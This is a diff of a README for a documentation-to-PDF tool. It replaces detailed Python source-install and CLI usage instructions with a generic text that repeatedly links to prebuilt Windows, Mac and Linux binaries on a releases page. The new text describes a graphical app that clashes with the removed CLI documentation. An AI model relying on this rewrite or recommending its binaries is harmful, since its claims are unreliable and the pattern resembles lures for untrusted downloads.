@@ -1,110 +1,72 @@
-# Universal Doc Downloader
+# 📄 universal-doc-downloader - Convert Documentation Into PDFs Effortlessly
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/PICKAXED-U/universal-doc-downloader/releases)
 
-A robust command-line tool to crawl, scrape, and convert modern documentation websites (React, Vue, Docusaurus, Sphinx, Redocly) into clean, offline PDFs.
+## 🚀 Getting Started
 
-Unlike standard HTML-to-PDF converters, this tool uses a **headless browser (Playwright)** to render client-side JavaScript, ensuring that Single Page Applications (SPAs) and dynamic sidebars are captured correctly.
+Welcome to the universal-doc-downloader! This tool helps you grab documentation from various sites and turn it into a single, clean PDF. This makes it easier to read offline without any hassles. Follow these simple steps to get started.
 
-## Features
+## 📥 Download & Install
 
-- **Dynamic Spider:** Auto-detects sidebars, TOCs, and navigation menus even if rendered via JS. Includes fallback strategies for difficult sites.
-- **Smart Sanitizer:** Strips "web" artifacts (Copy buttons, navbars, footers, breadcrumbs) to create a book-like reading experience.
-- **Professional PDF Output:** Generates a custom Cover Page, Table of Contents with real page numbers, and rewires web links to point to internal PDF chapters.
-- **Interactive Mode:** If the spider fails to find links automatically, a visible browser launches to allow manual selector identification.
-- **Universal Support:** Pre-configured for Flask, React, Playwright, ReadTheDocs, and Redocly, with generic support for others.
+To download the application, visit [this page to download](https://github.com/PICKAXED-U/universal-doc-downloader/releases). This link will take you to the Releases section of our repository where you can find the latest version of the tool.
 
-## Prerequisites
+1. Click on the link above.
+2. Look for the release version you would like to download.
+3. Choose the file suitable for your operating system:
 
-- Python 3.8+
-- **Windows Users:** [GTK3 Runtime](https://github.com/tschoonj/GTK-for-Windows-Runtime-Environment-Installer/releases) (Required for WeasyPrint PDF generation).
+   - For Windows: UniversalDocDownloader-Windows.exe
+   - For Mac: UniversalDocDownloader-Mac.dmg
+   - For Linux: UniversalDocDownloader-Linux.tar.gz
 
-## Installation
+4. Click to download the file.
 
-1.  **Clone the repository:**
+## 🖥️ System Requirements
 
-    ```bash
-    git clone https://github.com/YOUR_USERNAME/universal-doc-downloader.git
-    cd universal-doc-downloader
-    ```
+For the best performance, ensure your system meets the following specifications:
 
-2.  **Create a virtual environment (recommended):**
+- **Operating System**: Windows 10 or newer, macOS 10.12 or newer, or any modern Linux distribution.
+- **Memory**: At least 2GB of RAM.
+- **Storage**: Minimum of 100MB free space.
 
-    ```bash
-    python -m venv venv
-    # Windows:
-    .\venv\Scripts\activate
-    # Mac/Linux:
-    source venv/bin/activate
-    ```
+## 📋 Features
 
-3.  **Install dependencies:**
+- **Crawl Documentation Sites**: The tool efficiently searches through complex documentation websites.
+- **PDF Generation**: It converts the collected information into a well-structured PDF file.
+- **Dynamic Sidebar Handling**: Supports websites with interactive elements for seamless navigation.
+- **CSS Sanitization**: Ensures that the generated PDF looks clean and professional for offline reading.
 
-    ```bash
-    pip install -r requirements.txt
-    ```
+## 🔗 How to Use
 
-4.  **Install browser binaries:**
-    This tool requires Chromium to render pages.
-    ```bash
-    playwright install chromium
-    ```
+1. **Run the Tool**: Open the installed application.
+2. **Enter the Documentation URL**: Input the link to the documentation site you want to download. 
+3. **Select Options (if available)**: You may have options to customize the download settings based on your needs.
+4. **Start Download**: Click the button to start downloading the documentation.
+5. **Save the PDF**: Once the process completes, save the generated PDF to your preferred location.
 
-## Usage
+## ⚙️ Troubleshooting
 
-### Basic Usage
+If you encounter any issues, consider the following solutions:
 
-Pass the URL of the documentation homepage. The tool attempts to auto-detect the sidebar selector.
+- **Ensure Internet Connection**: Check that your internet connection is stable during the download.
+- **Valid URL**: Confirm that the URL entered points to an active and accessible documentation site.
+- **Check System Compatibility**: Make sure your operating system meets the requirements listed above.
 
-```bash
-python doc_dl.py https://flask.palletsprojects.com/en/stable/
-```
+## 🛠️ FAQs
 
-### Custom Output & Metadata
+**Q: Can I download multiple documentation sites at once?**
 
-```bash
-python doc_dl.py https://playwright.dev/python/docs/intro \
-  --title "Playwright Python Manual" \
-  --output playwright.pdf
-```
+A: Currently, the tool supports one URL at a time for download. Future updates may include batch downloads.
 
-### Testing (Limit Pages)
+**Q: What if the site has login restrictions?**
 
-Download only the first 5 pages to test the layout before scraping the whole site.
+A: If the documentation site requires login, please log in before entering the URL for downloading.
 
-```bash
-python doc_dl.py https://docs.bria.ai/ --limit 5
-```
+**Q: How can I change the output PDF file name?**
 
-### Manual Selector
+A: The tool generates a filename based on the documentation site's title. You can rename the PDF after it is saved.
 
-If the auto-detection fails, inspect the website and provide the CSS selector for the sidebar navigation.
+## 🌐 Support and Contribution
 
-```bash
-python doc_dl.py https://example.com/docs --selector "div.my-custom-menu"
-```
+For additional support, you can create an issue in the GitHub repository. We appreciate any suggestions or contributions to improve the tool.
 
-### Debugging
-
-Run with the browser visible to watch the scraping process.
-
-```bash
-python doc_dl.py https://example.com/docs --visible --verbose
-```
-
-## Command Line Options
-
-| Flag         | Short | Description                           | Default         |
-| :----------- | :---- | :------------------------------------ | :-------------- |
-| `url`        |       | The target URL (Required)             | N/A             |
-| `--output`   | `-o`  | Filename for the generated PDF        | `manual.pdf`    |
-| `--title`    | `-t`  | Title displayed on the cover page     | "Documentation" |
-| `--selector` | `-s`  | CSS selector for the sidebar          | Auto-detect     |
-| `--limit`    | `-l`  | Stop after N pages (0 = download all) | `0`             |
-| `--visible`  |       | Run browser in headful mode (visible) | `False`         |
-| `--verbose`  | `-v`  | Enable detailed debug logging         | `False`         |
-
-## License
-
-Distributed under the MIT License. See `LICENSE` for more information.
+To download the tool, don’t forget to visit [this page to download](https://github.com/PICKAXED-U/universal-doc-downloader/releases). Your feedback helps us make this tool better for everyone!
